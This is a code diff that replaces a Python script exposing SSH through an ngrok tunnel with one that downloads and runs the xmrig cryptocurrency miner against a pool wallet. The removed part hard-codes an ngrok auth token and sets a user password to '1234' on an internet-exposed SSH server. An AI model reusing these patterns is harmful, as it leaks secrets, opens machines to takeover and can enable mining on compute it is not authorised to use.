@@ -1,101 +1,58 @@
 import subprocess
-import signal
-import os
-import sys
 import requests
 import tarfile
-import logging
-
-# Configure logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler('ssh_ngrok.log'),
-        logging.StreamHandler()
-    ]
-)
+import os
 
 # Constants
-NGROK_URL = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
-NGROK_TAR = "ngrok-v3-stable-linux-amd64.tgz"
-NGROK_DIR = "./ngrok"
-NGROK_AUTH_TOKEN = "2ULlZeaFoXx7Kqk7kcYMlsel5JO_3mMWSwcCzs7uL4jtRaQ44"
+XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz"
+XMRIG_TAR = "xmrig-6.21.3-linux-static-x64.tar.gz"
+XMRIG_DIR = "./xmrig"
+XMRIG_BINARY = "./xmrig/xmrig"
 
-# Function to download and extract ngrok
-def download_and_extract_ngrok():
+# Function to download and extract xmrig
+def download_and_extract_xmrig():
     try:
-        response = requests.get(NGROK_URL)
-        with open(NGROK_TAR, 'wb') as file:
-            file.write(response.content)
-        with tarfile.open(NGROK_TAR, 'r:gz') as tar:
-            tar.extractall(path=NGROK_DIR)
-        logging.info("Downloaded and extracted ngrok successfully")
+        response = requests.get(XMRIG_URL, stream=True)
+        with open(XMRIG_TAR, 'wb') as file:
+            for chunk in response.iter_content(chunk_size=1024):
+                if chunk:
+                    file.write(chunk)
+        with tarfile.open(XMRIG_TAR, 'r:gz') as tar:
+            tar.extractall(path=XMRIG_DIR)
+        os.remove(XMRIG_TAR)  # Remove the downloaded tar.gz file after extraction
+        print("Downloaded and extracted xmrig successfully")
     except Exception as e:
-        logging.error(f"Failed to download and extract ngrok: {e}")
+        print(f"Failed to download and extract xmrig: {e}")
+        raise
 
-# Signal handler for Ctrl+C
-def signal_handler(sig, frame):
-    logging.info("Interrupt received, terminating subprocesses...")
-    ssh_process.terminate()
-    ngrok_process.terminate()
-    ssh_process.wait()
-    ngrok_process.wait()
-    sys.exit(0)
+# Run xmrig with specified parameters
+def run_xmrig():
+    try:
+        xmrig_command = f"{XMRIG_BINARY} -a gr -o stratum+ssl://ghostrider-asia.unmineable.com:443 -u XNO:nano_1hzgeyjjdue6u4zpjhnu8cwyok1d3xe3w3ysf56fw8ibe9pw8yumibxijopp.unmineable_worker_tltuwoiq -p x"
+        xmrig_process = subprocess.Popen(xmrig_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        # Print stdout and stderr in real-time
+        for line in iter(xmrig_process.stdout.readline, b''):
+            print(line.decode('utf-8').strip())
+        
+        xmrig_process.stdout.close()
+        xmrig_process.stderr.close()
+        xmrig_process.wait()
+    except Exception as e:
+        print(f"Error occurred while running xmrig: {e}")
+        raise
 
-# Check if the script is run as root
-if os.geteuid() != 0:
-    logging.error("This script must be run as root")
-    sys.exit(1)
+# Main function to orchestrate the process
+def main():
+    # Ensure xmrig directory exists
+    if not os.path.exists(XMRIG_DIR):
+        os.makedirs(XMRIG_DIR)
+    
+    # Download and extract xmrig
+    download_and_extract_xmrig()
 
-# Register the signal handler
-signal.signal(signal.SIGINT, signal_handler)
+    # Run xmrig
+    run_xmrig()
 
-# Download and extract ngrok
-if not os.path.exists(NGROK_DIR):
-    os.makedirs(NGROK_DIR)
-download_and_extract_ngrok()
-
-# Add ngrok authtoken
-try:
-    ngrok_auth_command = f"{NGROK_DIR}/ngrok config add-authtoken {NGROK_AUTH_TOKEN}"
-    subprocess.run(ngrok_auth_command, shell=True, check=True)
-    logging.info("Added ngrok authtoken successfully")
-except Exception as e:
-    logging.error(f"Failed to add ngrok authtoken: {e}")
-
-# Install and start the SSH server
-try:
-    install_ssh_command = "apt update && apt install -y openssh-server"
-    subprocess.run(install_ssh_command, shell=True, check=True)
-    logging.info("Installed and started SSH server successfully")
-except Exception as e:
-    logging.error(f"Failed to install and start SSH server: {e}")
-
-# Set password for user 'turjaun' and start the SSH service
-try:
-    ssh_command = "echo 'turjaun:1234' | chpasswd && service ssh start"
-    ssh_process = subprocess.Popen(ssh_command, shell=True)
-    logging.info("Set password for user 'turjaun' and started SSH service")
-except Exception as e:
-    logging.error(f"Failed to set password or start SSH service: {e}")
-
-# Start ngrok for SSH
-try:
-    ngrok_command = f"{NGROK_DIR}/ngrok tcp 22"
-    ngrok_process = subprocess.Popen(ngrok_command, shell=True)
-    logging.info("Started ngrok for SSH successfully")
-except Exception as e:
-    logging.error(f"Failed to start ngrok for SSH: {e}")
-
-# Wait for the subprocesses to complete
-try:
-    ssh_process.wait()
-    ngrok_process.wait()
-except Exception as e:
-    logging.error(f"Error occurred while waiting for subprocesses: {e}")
-finally:
-    if ssh_process.poll() is None:
-        ssh_process.terminate()
-    if ngrok_process.poll() is None:
-        ngrok_process.terminate()
+if __name__ == "__main__":
+    main()
